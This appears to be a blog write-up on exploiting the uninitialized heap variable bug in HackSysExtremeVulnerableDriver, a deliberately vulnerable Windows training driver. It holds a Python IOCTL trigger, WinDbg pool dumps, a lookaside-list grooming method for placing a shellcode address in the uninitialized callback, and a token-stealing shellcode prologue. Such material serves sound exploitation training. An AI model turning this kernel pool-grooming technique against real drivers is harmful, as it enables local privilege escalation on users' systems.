---
layout:     post
title:      HackSysExtremeVulnerableDriver UninitializedHeapVariable
author:     wooy0ung
tags:       hevd
category:   exploit
---

>[Analysis Environment]  
>guest machine: Windows 7 x86 sp0  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test POC

Let's work with the same steps like the last challenge.
```
import sys
from ctypes import *

kernel32 = windll.kernel32
psapi = windll.Psapi
ntdll = windll.ntdll

hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
   print "[-] Couldn't get Device Driver handle."
   sys.exit(0)

buf = "\xff\xff\xff\xff"

kernel32.DeviceIoControl(hevDevice, 0x222033, buf, len(buf), None, 0, byref(c_ulong()), None)
```

Set a breakpoint at TriggerUninitializedHeapVariable method
```
kd> bp HEVD!TriggerUninitializedHeapVariable+0x119
kd> g
****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******
[+] Pool Tag: 'kcaH'
[+] Pool Type: PagedPool
[+] Pool Size: 0xF0
[+] Pool Chunk: 0x983C6F10
[+] UserValue: 0xFFFFFFFF
[+] UninitializedHeapVariable Address: 0x8D6D5BB8
[+] Triggering Uninitialized Heap Variable Vulnerability
[+] UninitializedHeapVariable->Value: 0x00000000
[+] UninitializedHeapVariable->Callback: 0x05000000
Breakpoint 0 hit
HEVD!TriggerUninitializedHeapVariable+0x119:
957c3e83 ff5004          call    dword ptr [eax+4]
kd> !pool 0x983C6F10
Pool page 983c6f10 region is Paged pool
 983c6000 size:  200 previous size:    0  (Allocated)  MmRe
 983c6200 size:   38 previous size:  200  (Allocated)  CMVa
 983c6238 size:   10 previous size:   38  (Free)       CMVI
 983c6248 size:   50 previous size:   10  (Allocated)  NtFd
 983c6298 size:   e8 previous size:   50  (Allocated)  FMfn
 983c6380 size:   30 previous size:   e8  (Allocated)  CMpb Process: 9352eb88
···
 983c6dd8 size:   58 previous size:   28  (Allocated)  MmRe
 983c6e30 size:   b0 previous size:   58  (Allocated)  NpFc Process: 87ce03a8
 983c6ee0 size:   28 previous size:   b0  (Allocated)  NtFs
*983c6f08 size:   f8 previous size:   28  (Allocated) *Hack
		Owning component : Unknown (update pooltag.txt)
```


## 0x002 Exploit it!

Vulnerability is obvious, I don't want to say any more.
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-uninitializedheapvariable/0x001.png)

First, we should know some structure about Lookaside list and ListHead list

Lookaside list is normally organized by Singly Linked List, there is a block's layout on this kind of list after freeing. 
```
| _POOL_HEADER(8 byte) | _SINGLE_LIST_ENTRY(4 byte) | buffer[size] |
```

However, for ListHead list, which is organized by Double Linked List
```
| _POOL_HEADER(8字节) | _LIST_ENTRY(8 byte) | buffer[size] |
```

Now, we pay attention on the vulnerability module
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-uninitializedheapvariable/0x002.png)
The member Callback is at the offet of 0x4, that's mean the pool can't allocate by ListHead list, otherwise, "Callback" would be overwrite.

We need to allocate 256 objects of same size and then freeing them, because Lookaside list only manages upto 256 chunks. if increase the number, the allocation would come from ListHead list.

When our vulnerability method require a 0xf8 size pool, it will get a provioud chunks which organize by Lookaside list, while the content after the offset of 0x4 are no reseting.
```
****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******
[+] Pool Tag: 'kcaH'
[+] Pool Type: PagedPool
[+] Pool Size: 0xF0
[+] Pool Chunk: 0x97F9AB78
[+] UserValue: 0xBAD31337
[+] UninitializedHeapVariable Address: 0x935D7BB8
[+] Triggering Uninitialized Heap Variable Vulnerability
[+] UninitializedHeapVariable->Value: 0x00000000
[+] UninitializedHeapVariable->Callback: 0x0158D1EC
Breakpoint 0 hit
HEVD!TriggerUninitializedHeapVariable+0x119:
9579de83 ff5004          call    dword ptr [eax+4]
kd> !pool 0x97F9AB78
Pool page 97f9ab78 region is Paged pool
 97f9a638 size:    8 previous size:    0  (Allocated)  Frag
 97f9a640 size:   b0 previous size:    8  (Allocated)  VdPN
 97f9a6f0 size:    8 previous size:   b0  (Free)       Toke
 97f9a6f8 size:   18 previous size:    8  (Allocated)  CMNb (Protected)
 97f9a710 size:   18 previous size:   18  (Allocated)  CMIn (Protected)
 97f9a728 size:    8 previous size:   18  (Free)       CcPh
 97f9a730 size:   18 previous size:    8  (Allocated)  CMIn (Protected)
 97f9a748 size:   40 previous size:   18  (Allocated)  CMDa
 97f9a788 size:   38 previous size:   40  (Allocated)  CMVa
 97f9a7c0 size:   38 previous size:   38  (Allocated)  CMDa
 97f9a7f8 size:   18 previous size:   38  (Allocated)  CMNb (Protected)
 97f9a810 size:   48 previous size:   18  (Allocated)  CMVa
 97f9a858 size:   80 previous size:   48  (Allocated)  CMDa
 97f9a8d8 size:    8 previous size:   80  (Free)       ObNm
 97f9a8e0 size:   18 previous size:    8  (Allocated)  CMVI
 97f9a8f8 size:   20 previous size:   18  (Free)       SeSc
 97f9a918 size:   e0 previous size:   20  (Allocated)  FMfn
 97f9a9f8 size:   38 previous size:   e0  (Allocated)  CMDa
 97f9aa30 size:   18 previous size:   38  (Allocated)  PfFK
 97f9aa48 size:  120 previous size:   18  (Allocated)  FMfn
 97f9ab68 size:    8 previous size:  120  (Free)       FMfn
*97f9ab70 size:   f8 previous size:    8  (Allocated) *Hack
		Owning component : Unknown (update pooltag.txt)
 97f9ac68 size:  118 previous size:   f8  (Allocated)  FMfn
 97f9ad80 size:    8 previous size:  118  (Free)       Toke
 97f9ad88 size:   38 previous size:    8  (Allocated)  CMNb (Protected)
 97f9adc0 size:   38 previous size:   38  (Allocated)  CMNb (Protected)
 97f9adf8 size:   40 previous size:   38  (Allocated)  CMDa
 97f9ae38 size:   20 previous size:   40  (Allocated)  CMNb (Protected)
 97f9ae58 size:   38 previous size:   20  (Allocated)  CMDa
 97f9ae90 size:   60 previous size:   38  (Allocated)  Key  (Protected)
 97f9aef0 size:   38 previous size:   60  (Allocated)  CMNb (Protected)
 97f9af28 size:    8 previous size:   38  (Free)       FMfn
 97f9af30 size:   68 previous size:    8  (Allocated)  FIcs
 97f9af98 size:   68 previous size:   68  (Allocated)  FIcs
```

Now, it will call an uninitialized Addr, which we set up to our shellcode Addr
```
kd> dd 97f9ab70
97f9ab70  061f0201 6b636148 00000000 0158d1ec
97f9ab80  42424242 42424242 42424242 42424242
97f9ab90  42424242 42424242 42424242 42424242
97f9aba0  42424242 42424242 42424242 42424242
97f9abb0  42424242 42424242 42424242 42424242
97f9abc0  42424242 42424242 42424242 42424242
97f9abd0  42424242 42424242 42424242 42424242
97f9abe0  42424242 42424242 42424242 42424242
kd> u 0158d1ec
0158d1ec 90              nop
0158d1ed 90              nop
0158d1ee 90              nop
0158d1ef 90              nop
0158d1f0 60              pushad
0158d1f1 64a124010000    mov     eax,dword ptr fs:[00000124h]
0158d1f7 8b4050          mov     eax,dword ptr [eax+50h]
0158d1fa 89c1            mov     ecx,eax
```

pwn~
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-uninitializedheapvariable/0x003.png)